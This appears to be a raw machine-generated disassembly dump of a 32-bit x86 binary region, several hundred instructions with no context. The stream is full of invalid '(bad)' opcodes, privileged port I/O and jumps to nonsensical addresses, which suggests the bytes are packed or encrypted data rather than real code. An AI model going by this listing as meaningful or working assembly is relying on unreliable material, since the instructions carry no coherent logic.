  40d875:	test   DWORD PTR [edx+ebp*8+0x6f54bd79],edx
  40d87c:	pop    es
  40d87d:	and    esp,DWORD PTR [esp+0x32]
  40d881:	ret    
  40d882:	adc    ah,dl
  40d884:	scas   eax,DWORD PTR es:[edi]
  40d885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d886:	out    dx,eax
  40d887:	xchg   ebp,eax
  40d888:	mov    eax,0xf810084c
  40d88d:	and    ah,cl
  40d88f:	mov    bh,0xc8
  40d891:	stos   DWORD PTR es:[edi],eax
  40d892:	lods   al,BYTE PTR ds:[esi]
  40d893:	rcr    BYTE PTR [esi+0x28917f6f],cl
  40d899:	ficom  WORD PTR [ebx]
  40d89b:	jmp    0x40d90c
  40d89d:	xchg   esi,eax
  40d89e:	sar    ebp,cl
  40d8a0:	shl    DWORD PTR [ebx+0x25d32094],cl
  40d8a6:	rcl    DWORD PTR [edx+0x7f25244],0x4
  40d8ad:	and    eax,0x9c53af41
  40d8b2:	stos   BYTE PTR es:[edi],al
  40d8b3:	cmp    eax,0x63733e3f
  40d8b8:	cmp    cl,ah
  40d8ba:	iret   
  40d8bb:	mov    esi,0xf686800a
  40d8c0:	out    0xa3,al
  40d8c2:	mov    ecx,0xee1316c6
  40d8c7:	jmp    0x40d902
  40d8c9:	inc    esp
  40d8ca:	pushf  
  40d8cb:	dec    edx
  40d8cc:	je     0x40d861
  40d8ce:	adc    DWORD PTR [esi],0x2e00a8c8
  40d8d4:	dec    esp
  40d8d5:	jb     0x40d912
  40d8d7:	in     al,0x5a
  40d8d9:	mov    BYTE PTR [eax],al
  40d8db:	jbe    0x40d903
  40d8dd:	out    dx,al
  40d8de:	cld    
  40d8df:	jno    0x40d8da
  40d8e1:	in     eax,dx
  40d8e2:	data16 lahf 
  40d8e4:	icebp  
  40d8e5:	jno    0x40d8f2
  40d8e7:	add    eax,0xd29e1069
  40d8ec:	dec    ebp
  40d8ed:	pop    ds
  40d8ee:	jg     0x40d8e4
  40d8f0:	push   ecx
  40d8f1:	xchg   esi,eax
  40d8f2:	imul   bh
  40d8f4:	out    0x7,eax
  40d8f6:	jle    0x40d8d8
  40d8f8:	pop    es
  40d8f9:	dec    ecx
  40d8fa:	xchg   edx,eax
  40d8fb:	cwde   
  40d8fc:	jle    0x40d8ad
  40d8fe:	(bad)  
  40d8ff:	jmp    0xf1b18837
  40d904:	loop   0x40d94b
  40d906:	(bad)  
  40d907:	(bad)  
  40d908:	pop    edx
  40d909:	pop    esp
  40d90a:	pop    esi
  40d90b:	imul   esi,DWORD PTR [ebx-0x1a345184],0xcdf5922b
  40d915:	test   ch,dh
  40d917:	dec    ebp
  40d918:	dec    ecx
  40d919:	scas   eax,DWORD PTR es:[edi]
  40d91a:	push   edi
  40d91b:	add    dh,BYTE PTR [ecx]
  40d91d:	push   es
  40d91e:	mov    dl,0x81
  40d920:	xchg   esp,eax
  40d921:	arpl   WORD PTR [edx-0x30],bp
  40d924:	adc    ebp,DWORD PTR [ebx]
  40d926:	leave  
  40d927:	and    al,0xe2
  40d929:	push   esp
  40d92a:	xor    ah,dh
  40d92c:	sub    esi,edx
  40d92e:	pop    esi
  40d92f:	retf   
  40d930:	retf   0xf5f8
  40d933:	xor    al,0x73
  40d935:	mov    edi,0xea3a5454
  40d93a:	sbb    dh,0x66
  40d93d:	cli    
  40d93e:	xchg   ecx,eax
  40d93f:	push   es
  40d940:	addr16 das 
  40d942:	jp     0x40d940
  40d944:	in     al,0xff
  40d946:	cmc    
  40d947:	sbb    al,0x9f
  40d949:	sti    
  40d94a:	ret    0xde71
  40d94d:	repz mov fs,WORD PTR [ebx]
  40d950:	sbb    al,0xb9
  40d952:	jnp    0x40d983
  40d954:	xchg   ebp,eax
  40d955:	retf   0x6b18
  40d958:	jmp    0x40d997
  40d95a:	sahf   
  40d95b:	jns    0x40d94b
  40d95d:	and    eax,0x1dbfe8fe
  40d962:	in     eax,0x89
  40d964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d965:	aaa    
  40d966:	or     BYTE PTR [ebx+0x1bf92d69],dl
  40d96c:	mov    ds,WORD PTR [edx-0x1f]
  40d96f:	inc    edx
  40d970:	arpl   WORD PTR [edi-0x37f3ce10],ax
  40d976:	rcr    edx,cl
  40d978:	push   ebx
  40d979:	jmp    0xd570:0x5a75884d
  40d980:	pushf  
  40d981:	and    al,0xa0
  40d983:	out    0x5b,al
  40d985:	sbb    ebp,DWORD PTR [eax-0x226aef9c]
  40d98b:	outs   dx,DWORD PTR ds:[esi]
  40d98c:	ins    BYTE PTR es:[edi],dx
  40d98d:	add    ecx,esi
  40d98f:	test   ebp,0xc7b0f8b8
  40d995:	(bad)  
  40d997:	and    DWORD PTR [edx],esp
  40d999:	retf   0x6e48
  40d99c:	cmc    
  40d99d:	jecxz  0x40d9c0
  40d99f:	ins    BYTE PTR es:[edi],dx
  40d9a0:	retf   0x74ee
  40d9a3:	mov    ebx,0xd655c1d0
  40d9a8:	cmc    
  40d9a9:	call   0xdfb16da2
  40d9ae:	adc    ebp,eax
  40d9b0:	ror    BYTE PTR [esp+ebx*1+0x42],0x1c
  40d9b5:	dec    ebx
  40d9b6:	mov    ds:0x52666630,al
  40d9bb:	loopne 0x40d9c6
  40d9bd:	adc    eax,0x433ea05b
  40d9c2:	push   esi
  40d9c3:	push   eax
  40d9c4:	cdq    
  40d9c5:	cli    
  40d9c6:	mov    ?,WORD PTR [ebx]
  40d9c8:	in     al,0x1
  40d9ca:	fsub   st,st(0)
  40d9cc:	iret   
  40d9cd:	xor    al,BYTE PTR [ebx]
  40d9cf:	jo     0x40d96c
  40d9d1:	sub    cl,BYTE PTR [edi]
  40d9d3:	retw   0xd381
  40d9d7:	mov    ?,WORD PTR [edi-0x1d]
  40d9da:	add    al,al
  40d9dc:	mov    al,ds:0xc3809485
  40d9e1:	xor    ah,al
  40d9e3:	idiv   ebp
  40d9e5:	imul   edi,DWORD PTR [edx+0x0],0xffffffcc
  40d9e9:	mul    BYTE PTR [edx]
  40d9eb:	js     0x40da4c
  40d9ed:	les    edx,FWORD PTR [eax]
  40d9ef:	jbe    0x40d9c4
  40d9f1:	lods   al,BYTE PTR ds:[esi]
  40d9f2:	int    0x41
  40d9f4:	or     dl,bh
  40d9f6:	mov    ebp,0xe8941a9e
  40d9fb:	shl    BYTE PTR [eax-0x58],cl
  40d9fe:	enter  0xcbc0,0x17
  40da02:	das    
  40da03:	jb     0x40d9fe
  40da05:	loop   0x40da4c
  40da07:	cmp    al,0xdf
  40da09:	(bad)  
  40da0a:	idiv   DWORD PTR [edx+ebp*4]
  40da0d:	mov    ch,0x1a
  40da0f:	jae    0x40da04
  40da11:	repz mov esp,0x3443c1e1
  40da17:	call   0xb2e5:0x2af56a0d
  40da1e:	(bad)  
  40da1f:	and    BYTE PTR [ecx+0x6b],ah
  40da22:	mov    ebx,0xbecfb3cd
  40da27:	ror    cl,0x93
  40da2a:	retf   
  40da2b:	sub    al,0x2f
  40da2d:	lahf   
  40da2e:	out    0xe5,eax
  40da30:	adc    edx,DWORD PTR [edi+0x39]
  40da33:	jnp    0x40d9d6
  40da35:	les    edx,FWORD PTR [esi-0x55]
  40da38:	inc    esi
  40da39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da3a:	aas    
  40da3b:	mov    DWORD PTR [ebx+esi*8-0x6d77d2f6],edx
  40da42:	xchg   ebx,eax
  40da43:	hlt    
  40da44:	and    al,BYTE PTR [esi]
  40da46:	sbb    DWORD PTR [ecx],edi
  40da48:	jg     0x40daa4
  40da4a:	bound  esp,QWORD PTR [edi-0x10ac86b1]
  40da50:	ss shr ah,cl
  40da53:	sub    BYTE PTR [esi-0x52],dh
  40da56:	addr16 aad 0x1
  40da59:	ret    
  40da5a:	add    al,0xb4
  40da5c:	das    
  40da5d:	dec    esi
  40da5e:	aam    0xe9
  40da60:	or     eax,0x727d1e03
  40da65:	fwait
  40da66:	addr16 (bad) 
  40da68:	ds ret 
  40da6a:	js     0x40da5f
  40da6c:	dec    ecx
  40da6d:	push   0x35
  40da6f:	(bad)  
  40da70:	pop    esi
  40da71:	outs   dx,DWORD PTR ds:[esi]
  40da72:	enter  0x76e6,0x48
  40da76:	jg     0x40dac8
  40da78:	push   es
  40da79:	xor    DWORD PTR [edi-0x1d976368],esp
  40da7f:	sbb    dl,BYTE PTR [ecx+esi*1]
  40da82:	inc    esp
  40da83:	in     al,0x64
  40da85:	sub    BYTE PTR [edx-0xd5eff98],dh
  40da8b:	dec    BYTE PTR [ecx-0x7f]
  40da8e:	dec    esp
  40da8f:	add    al,0x49
  40da91:	sub    al,0x90
  40da93:	xor    esp,eax
  40da95:	mov    DWORD PTR [edx+0x6860181d],ebx
  40da9b:	int3   
  40da9c:	xor    eax,0x99f679c6
  40daa1:	test   DWORD PTR [ecx],esp
  40daa3:	inc    edx
  40daa4:	addr16 lahf 
  40daa6:	shl    ecx,1
  40daa8:	aad    0x3e
  40daaa:	xchg   ecx,eax
  40daab:	(bad)  
  40daad:	mov    ds:0xbf0b02d1,al
  40dab2:	test   edx,edi
  40dab4:	test   BYTE PTR [ebx+edi*8+0x7c],0x76
  40dab9:	adc    esp,DWORD PTR [eax+0x63]
  40dabc:	adc    ah,dl
  40dabe:	(bad)  
  40dabf:	xchg   esp,eax
  40dac0:	mov    bh,0x15
  40dac2:	mov    WORD PTR [edi],?
  40dac4:	mov    DWORD PTR [ebx],edi
  40dac6:	sbb    edx,DWORD PTR [eax+0x32]
  40dac9:	sbb    al,0xf4
  40dacb:	mov    ecx,0xaa31aee7
  40dad0:	adc    eax,0x5464cd9f
  40dad5:	and    eax,0x1b374505
  40dada:	sbb    ebx,DWORD PTR [ebx]
  40dadc:	xchg   esi,eax
  40dadd:	push   cs
  40dade:	jb     0x40dacd
  40dae0:	adc    eax,0xdbc04d54
  40dae5:	fisubr DWORD PTR [esi+0x32]
  40dae8:	and    edx,DWORD PTR [eax-0x47b4eccd]
  40daee:	(bad)  
  40daef:	or     al,0xe5
  40daf1:	shl    BYTE PTR [ecx+0x47172742],cl
  40daf7:	in     eax,dx
  40daf8:	dec    edx
  40daf9:	cld    
  40dafa:	popf   
  40dafb:	and    al,0x3c
  40dafd:	push   0x5cedee98
  40db02:	push   esp
  40db03:	sar    ebp,0xdb
  40db06:	add    DWORD PTR [esi+0x15],ecx
  40db09:	dec    edx
  40db0a:	jge    0x40dac7
  40db0c:	dec    ebp
  40db0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db0e:	push   ecx
  40db0f:	sbb    BYTE PTR [esi+0x36],0x25
  40db13:	mov    bl,0xd5
  40db15:	jge    0x40daaa
  40db17:	cmp    BYTE PTR [esi],ah
  40db19:	shl    DWORD PTR [ecx+0x1b1b9b02],1
  40db1f:	retf   0xeb82
  40db22:	sti    
  40db23:	xchg   esp,eax
  40db24:	stos   DWORD PTR es:[edi],eax
  40db25:	push   ebp
  40db26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db29:	imul   esi,DWORD PTR [esi],0x4d4e4c9b
  40db2f:	icebp  
  40db30:	sub    eax,0xef30f2df
  40db35:	std    
  40db36:	mov    dh,0xf7
  40db38:	adc    al,BYTE PTR [esi+0x21]
  40db3b:	popf   
  40db3c:	dec    esi
  40db3d:	mov    edx,DWORD PTR [ebx-0x59]
  40db40:	pop    esi
  40db41:	data16 stc 
  40db43:	int3   
  40db44:	pop    ecx
  40db45:	dec    esi
  40db46:	sahf   
  40db47:	cmp    cl,bh
  40db49:	ror    edi,cl
  40db4b:	ds (bad) 
  40db4d:	repnz (bad) [eax-0xa7aa953]
  40db54:	in     eax,dx
  40db55:	or     edx,esp
  40db57:	push   0x20e3782f
  40db5c:	jmp    0x40db88
  40db5e:	add    bh,0x4f
  40db61:	mov    al,0x4c
  40db63:	and    DWORD PTR [ecx],ebx
  40db65:	add    BYTE PTR [ecx],dl
  40db67:	and    al,0x11
  40db69:	push   ss
  40db6a:	sub    eax,0xa6f5cc38
  40db6f:	call   0x9a21:0x1779c385
  40db76:	or     DWORD PTR [eax],edi
  40db78:	rcr    BYTE PTR [edx+0x54],cl
  40db7b:	nop
  40db7c:	jb     0x40db18
  40db7e:	out    dx,al
  40db7f:	mov    al,ds:0x53dfb749
  40db84:	iret   
  40db85:	inc    edx
  40db86:	or     al,0x22
  40db88:	add    BYTE PTR [edi-0x560bf57c],bh
  40db8e:	xchg   ebx,eax
  40db8f:	sbb    eax,0xe8098632
  40db94:	gs retf 
  40db96:	add    al,0xcc
  40db98:	(bad)  
  40db99:	int3   
  40db9a:	jnp    0x40dc14
  40db9c:	push   esi
  40db9d:	add    eax,0x8c811248
  40dba2:	and    eax,0x85884889
  40dba7:	xchg   edi,ebp
  40dba9:	push   0x2a
  40dbab:	add    ah,bh
  40dbad:	cdq    
  40dbae:	test   BYTE PTR [ebp+0x4f5cc2d0],dl
  40dbb4:	fistp  DWORD PTR [ebx-0x50]
  40dbb7:	test   al,0x20
  40dbb9:	mov    ebp,0xcf21a8d7
  40dbbe:	and    BYTE PTR [edx],cl
  40dbc0:	enter  0xc86,0x67
  40dbc4:	(bad)  
  40dbc5:	mov    edx,DWORD PTR [eax]
  40dbc7:	ret    0xf171
  40dbca:	inc    ebp
  40dbcb:	neg    BYTE PTR [edx]
  40dbcd:	or     cl,BYTE PTR [eax+0x4e096de4]
  40dbd3:	xlat   BYTE PTR ds:[ebx]
  40dbd4:	mov    ds:0x8e915d6c,al
  40dbd9:	add    cl,BYTE PTR [edx+edx*4-0x78]
  40dbdd:	test   eax,0x8c664a89
  40dbe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbe3:	lahf   
  40dbe4:	and    DWORD PTR [ebx+0x37076c0a],ebx
  40dbea:	loopne 0x40dbb1
  40dbec:	(bad)  
  40dbed:	jg     0x40dbeb
  40dbef:	jecxz  0x40dba8
  40dbf1:	rol    BYTE PTR [edx+0x54],cl
  40dbf4:	fsubr  DWORD PTR [esi+0x32]
  40dbf7:	pop    ds
  40dbf8:	and    bl,0x53
  40dbfb:	iret   
  40dbfc:	sbb    BYTE PTR [ebx],dh
  40dbfe:	mov    dl,0x1f
  40dc00:	ret    0x1c35
  40dc03:	call   0x495c:0xfdbbcf97
  40dc0a:	lahf   
  40dc0b:	dec    edi
  40dc0c:	and    bl,BYTE PTR [edx-0xc]
  40dc0f:	or     al,0x79
  40dc11:	retf   
  40dc12:	stos   BYTE PTR es:[edi],al
  40dc13:	stos   DWORD PTR es:[edi],eax
  40dc14:	dec    edx
  40dc15:	mov    eax,0xfe5be5c7
  40dc1a:	xor    esp,0xffffffba
  40dc1d:	pop    ebp
  40dc1e:	pop    ebp
  40dc1f:	jne    0x40dc87
  40dc21:	je     0x40dc82
  40dc23:	pop    esi
  40dc24:	in     eax,0xb0
  40dc26:	(bad)  
  40dc27:	fsub   QWORD PTR [ecx+eiz*2]
  40dc2a:	shr    bh,1
  40dc2c:	jae    0x40dc1f
  40dc2e:	cld    
  40dc2f:	jns    0x40dc86
  40dc31:	(bad)
  40dc35:	xchg   ebp,eax
  40dc36:	dec    edx
  40dc37:	aam    0xea
  40dc39:	jne    0x40dc01
  40dc3b:	daa    
  40dc3c:	daa    
  40dc3d:	cdq    
  40dc3e:	sahf   
  40dc3f:	sahf   
  40dc40:	data16 (bad) 
  40dc42:	(bad)  
  40dc43:	mov    ebx,0xdffbe6f9
  40dc48:	and    bh,0x9
  40dc4b:	cmp    bl,ch
  40dc4d:	imul   ebp,DWORD PTR ss:[ebx-0x69],0xffffffb9
  40dc52:	js     0x40dc35
  40dc54:	add    ch,BYTE PTR [edi]
  40dc56:	mov    edi,0xcf33ccb2
  40dc5b:	sahf   
  40dc5c:	in     al,0xe4
  40dc5e:	jmp    0x662c4799
  40dc63:	ss mov dh,0xa7
  40dc66:	fldcw  WORD PTR [edi+ecx*2+0x20]
  40dc6a:	pop    es
  40dc6b:	gs nop
  40dc6d:	adc    eax,0xabc03528
  40dc72:	sub    BYTE PTR [edi],0x40
  40dc75:	or     al,0x41
  40dc77:	xchg   BYTE PTR [eax-0x58],al
  40dc7a:	sbb    BYTE PTR [ebx+0x755498c],al
  40dc80:	lods   eax,DWORD PTR ds:[esi]
  40dc81:	retf   
  40dc82:	out    dx,eax
  40dc83:	xchg   BYTE PTR [ecx],bh
  40dc85:	pop    eax
  40dc86:	out    dx,eax
  40dc87:	xor    BYTE PTR [ebx-0x76],0x9d
  40dc8b:	inc    ebp
  40dc8c:	test   al,0xf5
  40dc8e:	ins    DWORD PTR es:[edi],dx
  40dc8f:	test   BYTE PTR [edx+0x2a],al
  40dc92:	add    al,0x28
  40dc94:	xlat   BYTE PTR ds:[ebx]
  40dc95:	sahf   
  40dc96:	imul   edx,eax,0xb
  40dc99:	aam    0x1f
  40dc9b:	mov    cs,WORD PTR [edx]
  40dc9d:	popa   
  40dc9e:	outs   dx,DWORD PTR ds:[esi]
  40dc9f:	popf   
  40dca0:	ret    0xa47c
  40dca3:	mov    dh,0x1
  40dca5:	in     al,0x1e
  40dca7:	leave  
  40dca8:	adc    bh,BYTE PTR [edi+0x4812344c]
  40dcae:	dec    eax
  40dcaf:	jl     0x40dc32
  40dcb1:	mov    ch,dl
  40dcb3:	xor    edi,DWORD PTR [eax+0x76]
  40dcb6:	test   DWORD PTR cs:[ecx-0x57e729a2],edi
  40dcbd:	inc    edi
  40dcbe:	or     BYTE PTR [esi],ch
  40dcc0:	mov    bl,0xb1
  40dcc2:	scas   al,BYTE PTR es:[edi]
  40dcc3:	ret    
  40dcc4:	dec    esp
  40dcc5:	add    al,0x66
  40dcc7:	cs mov dh,0x5f
  40dcca:	mov    edx,0x9ae7406e
  40dccf:	cdq    
  40dcd0:	outs   dx,BYTE PTR ds:[esi]
  40dcd1:	retf   
  40dcd2:	mov    ds,WORD PTR [ebx]
  40dcd4:	xor    DWORD PTR [eax-0x6],0x62e32776
  40dcdb:	sbb    bh,BYTE PTR [ebp+0x2303a669]
  40dce1:	pop    es
  40dce2:	aam    0xaa
  40dce4:	push   ds
  40dce5:	ret    
  40dce6:	popa   
  40dce7:	pop    eax
  40dce8:	cmp    BYTE PTR [esi-0xd],cl
  40dceb:	jae    0x40dd49
  40dced:	or     bl,dl
  40dcef:	ins    DWORD PTR es:[edi],dx
  40dcf0:	lsl    eax,WORD PTR [esi-0x56ffbb65]
  40dcf7:	mov    ebx,0x47310b2f
  40dcfc:	ins    DWORD PTR es:[edi],dx
  40dcfd:	add    BYTE PTR [esi-0x3e],ch
  40dd00:	nop
  40dd01:	lods   al,BYTE PTR ds:[esi]
  40dd02:	push   ds
  40dd03:	call   0x5213df3a
  40dd08:	jns    0x40dcdf
  40dd0a:	and    BYTE PTR [edi],ch
  40dd0c:	in     eax,0x8b
  40dd0e:	mov    WORD PTR [edi+0x46],?
  40dd11:	lahf   
  40dd12:	retf   0xf470
  40dd15:	pushf  
  40dd16:	ficom  DWORD PTR [eax-0x14af0181]
  40dd1c:	popa   
  40dd1d:	imul   esp,DWORD PTR [ecx],0x797e1b93
  40dd23:	in     eax,dx
  40dd24:	jmp    0x1125e61f
  40dd29:	aas    
  40dd2a:	push   es
  40dd2b:	andnps xmm4,xmm3
  40dd2e:	jge    0x40dda3
  40dd30:	jae    0x40dcc5
  40dd32:	jae    0x40dcdb
  40dd34:	dec    edi
  40dd35:	repz inc edx
  40dd37:	mov    ecx,0xa254a94c
  40dd3c:	push   edx
  40dd3d:	lods   eax,DWORD PTR ds:[esi]
  40dd3e:	xor    bh,BYTE PTR [esi]
  40dd40:	ds dec esi
  40dd42:	lods   eax,DWORD PTR ds:[esi]
  40dd43:	pop    esi
  40dd44:	addr16 jb 0x40ddb9
  40dd47:	xor    DWORD PTR [edi-0x42],0x7bef30e3
  40dd4e:	(bad)  
  40dd50:	lock cmp eax,0x65d870c9
  40dd56:	jne    0x40dd05
  40dd58:	(bad)
  40dd5b:	sub    eax,0x9cfa3636
  40dd60:	ds mov ebx,0xbccfd3c9
  40dd66:	ret    0xbb9
  40dd69:	pop    ebx
  40dd6a:	ins    BYTE PTR es:[edi],dx
  40dd6b:	mov    bh,0x7c
  40dd6d:	scas   al,BYTE PTR es:[edi]
  40dd6e:	outs   dx,BYTE PTR ds:[esi]
  40dd6f:	dec    esp
  40dd70:	and    bl,al
  40dd72:	sbb    eax,esi
  40dd74:	sbb    esp,DWORD PTR [eax]
  40dd76:	es and al,dh
  40dd79:	ror    DWORD PTR [ebx+0x208fac35],0xd1
  40dd80:	or     al,0x22
  40dd82:	sbb    DWORD PTR [edx],ebp
  40dd84:	mov    ds:0x22ffb133,al
  40dd89:	sti    
  40dd8a:	cmp    eax,0x4dc92d32
  40dd8f:	pop    ss
  40dd90:	ss dec esp
  40dd92:	shr    dl,0xed
  40dd95:	scas   al,BYTE PTR es:[edi]
  40dd96:	mov    ah,0xb
  40dd98:	mov    dl,0xb0
  40dd9a:	xlat   BYTE PTR ds:[ebx]
  40dd9b:	xor    cl,BYTE PTR [esi-0xb4342dc]
  40dda1:	sub    al,0x4d
  40dda3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dda4:	fiadd  WORD PTR ds:0x84568157
  40ddaa:	and    BYTE PTR fs:[esi-0x5656648e],bh
  40ddb1:	mov    bl,0x71
  40ddb3:	adc    ah,bl
  40ddb5:	lds    ebp,FWORD PTR [eax]
  40ddb7:	add    dh,ch
  40ddb9:	dec    ebp
  40ddba:	adc    DWORD PTR ds:0xee9db78b,0xadb5e996
  40ddc4:	jge    0x40dd86
  40ddc6:	fcomp  QWORD PTR [edi-0x71]
  40ddc9:	adc    eax,0xb420c452
  40ddce:	stc    
  40ddcf:	xor    eax,0x82a7afaf
  40ddd4:	dec    ecx
  40ddd5:	ja     0x40dd5c
  40ddd7:	mov    ecx,0x7333ed9e
  40dddc:	cwde   
  40dddd:	xor    al,0x47
  40dddf:	addr16 lahf 
  40dde1:	lds    ebp,FWORD PTR [edx+edi*1+0x53359aaa]
  40dde8:	and    al,0x10
  40ddea:	inc    esi
  40ddeb:	push   eax
  40ddec:	scas   eax,DWORD PTR es:[edi]
  40dded:	dec    ecx
  40ddee:	out    dx,al
  40ddef:	cmp    dl,ah
  40ddf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddf2:	fild   QWORD PTR [edi]
  40ddf4:	scas   al,BYTE PTR es:[edi]
  40ddf5:	add    eax,0x35f7c660
  40ddfa:	bound  eax,QWORD PTR [eax]
  40ddfc:	dec    esi
  40ddfd:	mov    ds,WORD PTR [esp+esi*2-0x19b225e5]
  40de04:	add    al,0x34
  40de06:	mov    edx,0x2af981bd
  40de0b:	inc    ebp
  40de0c:	xchg   ebp,eax
  40de0d:	mov    dl,0x1
  40de0f:	mov    BYTE PTR ds:0x613949ce,bl
  40de15:	push   ds
  40de16:	and    bl,BYTE PTR [ecx-0xd0f451a]
  40de1c:	inc    esp
  40de1d:	popf   
  40de1e:	xlat   BYTE PTR ds:[ebx]
  40de1f:	test   eax,0xc8aab0f2
  40de24:	push   eax
  40de25:	push   0x431188d4
  40de2a:	int3   
  40de2b:	pusha  
  40de2c:	loopne 0x40de76
  40de2e:	xchg   BYTE PTR [ebx],bl
  40de30:	outs   dx,DWORD PTR ds:[esi]
  40de31:	add    cl,BYTE PTR [eax-0x2d0a671e]
  40de37:	adc    eax,0xc42207ca
  40de3c:	xor    BYTE PTR [eax],ah
  40de3e:	mov    ecx,0x1a954d3a
  40de43:	sahf   
  40de44:	outs   dx,DWORD PTR ds:[esi]
  40de45:	(bad)  
  40de46:	xlat   BYTE PTR ds:[ebx]
  40de47:	adc    eax,DWORD PTR [esi-0x50b0fcc6]
  40de4d:	fisttp DWORD PTR [ebp-0x4d]
  40de50:	or     eax,0x9972a501
  40de55:	push   edx
  40de56:	adc    al,dl
  40de58:	sbb    al,0x1b
  40de5a:	arpl   WORD PTR [esi+0x76],sp
  40de5d:	xchg   esi,eax
  40de5e:	pop    es
  40de5f:	pop    esi
  40de60:	mov    bh,0x8f
  40de62:	icebp  
  40de63:	mov    DWORD PTR [ecx-0x16],esi
  40de66:	mov    ch,0xa
  40de68:	and    DWORD PTR [ecx-0x61],0x4e
  40de6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de6d:	lds    ebx,FWORD PTR [ecx-0x2c334cd]
  40de73:	hlt    
  40de74:	jno    0x40ded4
  40de76:	jl     0x40de69
  40de78:	add    ch,BYTE PTR [edi]
  40de7a:	popf   
  40de7b:	fsub   st,st(6)
  40de7d:	in     al,dx
  40de7e:	add    eax,0x126d5958
  40de83:	jbe    0x40de2b
  40de85:	rcr    DWORD PTR [edi+0x2fcc082],0x48
  40de8c:	dec    eax
  40de8d:	jp     0x40deaf
  40de8f:	pop    es
  40de90:	adc    BYTE PTR [edi],cl
  40de92:	aam    0xb2
  40de94:	push   ebp
  40de95:	and    DWORD PTR [eax+ebx*8-0x55],ebx
  40de99:	jg     0x40de26
  40de9b:	and    al,BYTE PTR [esi]
  40de9d:	lea    edx,[edi-0x40]
  40dea0:	xor    dl,BYTE PTR [ecx+0x30cf0754]
  40dea6:	adc    ebp,DWORD PTR [ecx+0x18e78791]
  40deac:	adc    eax,0x5f404c33
  40deb1:	or     esp,DWORD PTR [ecx-0x2322a44a]
  40deb7:	mov    al,ds:0x13df052c
  40debc:	cmp    eax,0x44f13fff
  40dec1:	push   0xffffffd0
  40dec3:	jae    0x40ded8
  40dec5:	js     0x40df2d
  40dec7:	adc    BYTE PTR [ebx+edi*2-0xe608b23],ah
  40dece:	sbb    ah,BYTE PTR [esp+ecx*1+0x80aa721]
  40ded5:	xchg   DWORD PTR [eax+0x592efba5],ecx
  40dedb:	out    0x20,al
  40dedd:	xor    edx,edx
  40dedf:	(bad)  
  40dee1:	inc    edx
  40dee2:	iret   
  40dee3:	xor    ecx,eax
  40dee5:	xor    DWORD PTR [ebx-0x5be7f66c],esp
  40deeb:	mov    ds:0x289c5a18,al
  40def0:	pop    ss
  40def1:	loopne 0x40df47
  40def3:	push   ebx
  40def4:	mov    dl,0x6f
  40def6:	outs   dx,DWORD PTR ds:[esi]
  40def7:	xchg   ebx,eax
  40def8:	xor    dl,ch
  40defa:	out    dx,al
  40defb:	mov    BYTE PTR [eax],ch
  40defd:	dec    ebp
  40defe:	push   es
  40deff:	stos   BYTE PTR es:[edi],al
  40df00:	cld    
  40df01:	std    
  40df02:	je     0x40df3f
  40df04:	ret    
  40df05:	stos   DWORD PTR es:[edi],eax
  40df06:	shr    BYTE PTR [esi-0x26],1
  40df09:	or     BYTE PTR [eax+0x5b36ffa6],bl
  40df0f:	pop    ebp
  40df10:	inc    edx
  40df11:	iret   
  40df12:	dec    edx
  40df13:	pop    edi
  40df14:	jecxz  0x40df25
  40df16:	ja     0x40dea1
  40df18:	mov    bh,0x8
  40df1a:	add    eax,0xef9b04b8
  40df1f:	les    edi,FWORD PTR [edx+edi*2-0x46738bb0]
  40df26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df27:	pop    ecx
  40df28:	into   
  40df29:	pop    ebx
  40df2a:	pop    ebx
  40df2b:	or     eax,0x68a3097a
  40df30:	neg    DWORD PTR [edx-0x4b]
  40df33:	xchg   esp,eax
  40df34:	or     BYTE PTR [edx+edi*1],bh
  40df37:	mov    dl,0x45
  40df39:	mov    eax,0xf7932aff
  40df3e:	push   esp
  40df3f:	or     bl,bl
  40df41:	xchg   edx,eax
  40df42:	mov    al,0x53
  40df44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df45:	fisubr DWORD PTR [esi+0x3928b1a5]
  40df4b:	in     al,0x11
  40df4d:	add    al,0x41
  40df4f:	pop    edx
  40df50:	add    DWORD PTR [edi+0x3f],eax
  40df53:	fcmovnbe st,st(6)
  40df55:	out    0x26,al
  40df57:	imul   ebp,DWORD PTR [ebx+0x6b],0xfffffff6
  40df5b:	jns    0x40df07
  40df5d:	fisubr DWORD PTR [esi-0x3ecec6d0]
  40df63:	rcl    dl,cl
  40df65:	pop    ebp
  40df66:	jl     0x40df5b
  40df68:	aaa    
  40df69:	mov    edi,0xa2884801
  40df6e:	add    DWORD PTR [ebx],ebp
  40df70:	xchg   edi,eax
  40df71:	das    
  40df72:	repnz aam 0xd3
  40df75:	(bad)  
  40df76:	pop    eax
  40df77:	pop    esi
  40df78:	mov    esi,0x9d2f8bcc
  40df7d:	out    0xb9,al
  40df7f:	pop    ss
  40df80:	sahf   
  40df81:	addr16 in eax,0x6a
  40df84:	test   DWORD PTR [ebp+0x7b2426ed],ebp
  40df8a:	rcr    BYTE PTR [ebx-0x1aa380fe],0xa2
  40df91:	sub    cl,BYTE PTR [ecx]
  40df93:	dec    ebp
  40df94:	cwde   
  40df95:	xchg   BYTE PTR [ecx],bl
  40df97:	je     0x40dfb6
  40df99:	xchg   esp,eax
  40df9a:	pusha  
  40df9b:	bound  edx,QWORD PTR [edi]
  40df9d:	adc    ch,ch
  40df9f:	pop    esi
  40dfa0:	shl    DWORD PTR [eax+0x5e],cl
  40dfa3:	call   0x47d261b
  40dfa8:	cmp    edi,DWORD PTR [eax+0x2a]
  40dfab:	adc    al,bh
  40dfad:	repnz out dx,eax
  40dfaf:	stos   BYTE PTR es:[edi],al
  40dfb0:	adc    edx,ebp
  40dfb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfb3:	cmc    
  40dfb4:	jns    0x40dfef
  40dfb6:	fild   DWORD PTR [eax-0x4e6abbac]
